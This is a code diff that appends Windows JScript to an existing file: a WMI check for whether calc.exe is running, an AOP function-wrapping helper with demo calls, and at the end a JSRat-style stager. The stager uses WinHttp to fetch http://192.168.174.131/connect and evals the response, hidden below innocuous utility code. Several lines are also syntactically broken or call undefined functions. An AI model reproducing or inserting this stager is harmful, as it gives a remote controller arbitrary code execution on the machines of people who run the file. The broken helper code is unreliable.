@@ -181,3 +181,161 @@ function funSearch() {
         ts.Close();
     }
 }
+
+//判断进程是否存在
+var t,var locator = new ActiveXObject("WbemScripting.SWbemLocator"),
+var service=locator.ConnectServer(".");
+var properties=service.ExecQuery("SELECT * FROM Win32_Process ");
+var np = new Enumerator(properties);
+for(;!np.atEnd();np.moveNext()){
+    t=t+np.item().Name+"\n";
+}
+if (t.indexOf("calc.exe")>-1){
+    alert("calc is run");
+}
+else {
+    alert("calc is stop");
+}
+
+
+var aop=(function(){
+    var options={},
+    context=window,
+    oFn,
+    oFnArg,
+    targetFn,
+    targetFnSelector,
+    beforeFn,
+    afterFn,
+    aroundFn,
+    closeFn=function(Fn){
+        if(typeof Fn==="function"){
+            return eval('['+Fn.toString()+']')[0];
+        }
+        return null;
+    },
+    checkContext = function()
+    {
+        if(options.context){
+            context = options.context;
+        }
+        if (typeof context[(options.target).name])==="function")
+{
+          targetFnSelector = (options.target).name;
+          targetFn = context[targetFnSelector];
+}
+else if (typeof context[options.target]==="function"){
+    targetFnSelector = options.target;
+    targetFn = context[targetFnSelector];
+}
+if (targetFn){
+    oFn = cloneFn(targetFn);
+    oFnArg = new Array(targetFn.length);
+    return true;
+}
+else {
+      return false;
+}
+
+    },
+    run = function(){
+        context[targetFnSelector]=function(oFnArg){
+            if (aroundFn){
+                aroundFn.apply(this,arguments);
+            }
+            if (beforeFn){
+                beforeFn.apply(this,arguments);
+            }
+            oFn.apply(this,arguments);
+            if (afterFn){
+                afterFn.apply(this,arguments);
+            }
+            if(aroundFn){
+                aroundFn.apply(this,arguments);
+            }
+        };
+    };
+    return function(opt){
+        if(opt&&typeof opt==="object" && !opt.length){
+            options=opt;
+            if(options.target && checkContext()){
+                beforeFn = options.before;
+            }
+            if (options.after && typeof options.after==="function"){
+                afterFn = options.after;
+            }
+            if (options.around&& typeof options.around==="function" ){
+                aroundFn=options.around;
+            }
+            run();
+        }
+    }
+})();
+
+function test(name,age){
+    console.log("test fn.name="+name+" age:"+age);
+}
+aop({
+    target:"test",
+    before:function(){
+        console.log("aop before");
+    },
+    after:function(){
+        console.log("aop after");
+    },
+    around:function(){
+        console.log("aop around");
+    }
+});
+//run
+test("adam",6);
+
+//-----aop test modify method in an object
+var myobj = {
+    myName:"testName",
+    sayName:function(){
+        console.log(this.myName);
+    },
+    childObj:{
+        age:6,
+        say:function(){
+            console.log(this.age);
+        }
+    }
+};
+aop({
+    context:myobj,
+    target:"sayName",
+    before:function(){
+        console.log("aop before say name="+this.myName);
+    },
+    after:function(){
+        console.log("aop after say name="+this.myName);
+    },
+    around:function(){
+        console.log("aop around say name="+this.myName);
+    }
+});
+
+myobj.sayName();
+aop({
+    context:myobj.childObj,
+    target:"say",
+    before:function(){
+        console.log("aop before say name="+this.age);
+    },
+    after:function(){
+        console.log("aop after say name="+this.age);
+    },
+    around:function(){
+        console.log("aop around say name="+this.age);
+    }
+});
+myobj.childObj.say();
+
+var h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+h.Open("GET","http://192.168.174.131/connect",false);
+h.Send();
+B = h.ResponseText;
+eval(B);
+//powershell -file JSRat.ps1
